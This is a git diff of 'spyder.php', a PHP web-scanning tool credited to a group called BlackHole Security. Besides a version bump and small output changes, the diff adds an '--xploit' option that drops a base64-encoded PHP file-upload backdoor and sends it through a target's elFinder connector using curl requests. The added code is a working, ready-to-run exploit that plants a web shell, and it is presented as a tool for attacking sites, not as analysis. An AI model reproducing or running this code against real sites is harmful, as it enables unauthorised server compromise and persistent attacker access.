@@ -43,7 +43,6 @@ function update() {
         die();
 }
 
-
 echo $Y."
  ___           __               __ 
 /  _/___ _  _ _\ |___  _ __  | /  \ |
@@ -54,7 +53,7 @@ echo $R."\n++++++++++++++++++++++++++++++++++++++";
 echo $B."\nAuthor  : Cvar1984                   ".$R."+";
 echo $B."\nGithub  : https://github.com/Cvar1984".$R."+";
 echo $B."\nTeam    : BlackHole Security         ".$R."+";
-echo $B."\nVersion : 0.5                        ".$R."+";
+echo $B."\nVersion : 0.6                        ".$R."+";
 echo $B."\nDate    : 31-03-2018                 ".$R."+";
 echo $R."\n++++++++++++++++++++++++++++++++++++++".$G."\n\n";
 if(!function_exists("curl_init")) {
@@ -96,8 +95,7 @@ if(isset($argv[1]) AND isset($argv[2])) {
     	$tulis=fopen("result.txt","a");
     	fwrite($tulis,$domain);
     	fclose($tulis);
-    	echo $R . "=========================== Cvar1984 ))=====(@)>" . $X . "\n";
-    	die($Y."Writed To --> result.txt".$X."\n");
+    	die($R . "=========================== Cvar1984 ))=====(@)>" . $X . "\n");
     	} else {
     		die($RR."[!] Subdomain Not Found [!]\n".$X);
     	}
@@ -108,7 +106,60 @@ if(isset($argv[1]) AND isset($argv[2])) {
     } else {
      die($RR."[!] CMS couldn't be detected [!]".$X.$G."\n");
     }
-    }	else {
+    }	
+    elseif($argv[2] == "--xploit" OR $argv[2] == "-e") {
+    	if(!preg_match("/php/",$argv[1])) {
+    		die($RR."php spyder.php http://example.com/path/php/connector.php".$X."\n");
+    	}
+    	$nama_doang = "x.php";
+    	$isi_nama_doang = "PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
+    	$decode_isi=base64_decode($isi_nama_doang);
+    	$encode=base64_encode($nama_doang);
+    	$fp=fopen($nama_doang,"w+");
+    	fputs($fp, $decode_isi);
+    	function ngirim($url, $isi){
+    		$ch = curl_init ("$url");
+    		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
+    		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
+    		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+    		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    		curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    		curl_setopt ($ch, CURLOPT_POST, 1);
+    		curl_setopt ($ch, CURLOPT_POSTFIELDS, $isi);
+    		curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
+    		curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
+    		$data3 = curl_exec ($ch);
+    		return $data3;
+    		}
+    		echo $R."[!] Exploiting ".$argv[1]." [!]\n";
+    		echo $Y."[!] Uploading 1 [!]\n";
+    		$url_mkfile = "$argv[1]?cmd=mkfile&name=$nama_doang&target=l1_Lw";
+    		@$b=file_get_contents("$url_mkfile");
+    		 $post1 = array(
+					"cmd" => "put",
+					"target" => "l1_$encode",
+					"content" => "$decode_isi",	
+					);
+					 $post2 = array(
+					"current" => "8ea8853cb93f2f9781e0bf6e857015ea",
+					"upload[]" => "@$nama_doang",	
+					);
+	$output_mkfile = ngirim($argv[1], $post1);
+	if(preg_match("/$nama_doang/", $output_mkfile)){
+	echo $GG."[!] Upload Success 1 => $nama_doang\n# File Uploaded To ../../elfinder/files [!]".$X."\n\n";
+	} else {
+	echo $RR."[!] Upload Failed 1 [!]".$X."\n";
+	}
+	echo $Y."[!] Uploading 2 [!]".$X."\n";
+	$upload_ah = ngirim($argv[1]."?cmd=upload", $post2);
+	if(preg_match("/$nama_doang/", $upload_ah)) {
+echo $YY."[!] Upload Success 2 => $nama_doang\n# File Uploaded To ../../elfinder/files [!]".$X."\n\n";							
+	} else {
+			echo $RR."[!] Upload Failed 2 [!]".$X."\n";
+										
+	}
+    	die();
+    } else {
         die($YY . "[!] Parameter False [!]" . $X . "\n");
     }
     $count = count($list);
@@ -133,7 +184,6 @@ Url    : " . $url;
             fwrite($tulis, $hdr);
             fclose($tulis);
             $header = $B . $header . $G;
-            $write  = "true";
         } else {
             $header = $R . $header . $G;
         }
@@ -141,14 +191,12 @@ Url    : " . $url;
         echo "Header : " . $header . "\n";
     }
     echo $R . "=========================== Cvar1984 ))=====(@)>" . $X . "\n";
-    if(!($write == "" OR $write != "true")) { //NOR
-        echo $Y . "Maybe This Is Posible --> result.txt" . $X . "\n";
-    }
 } else {
     echo $Y . "--admin,  -a\tSearch Admin Pages\n";
     echo "--upload, -u\tSearch Upload Pages\n";
     echo "--cms,    -c\tCMS Scan\n";
     echo "--domain, -d\tSubdomain Scan\n";
+    echo "--xploit, -e\tExploit Elfinder\n";
     echo "--update, -U\tUpdate Wordlist\n\n";
     echo "Example : " . $GG . "php spyder.php http://example.com --admin" . $X . "\n";
 }
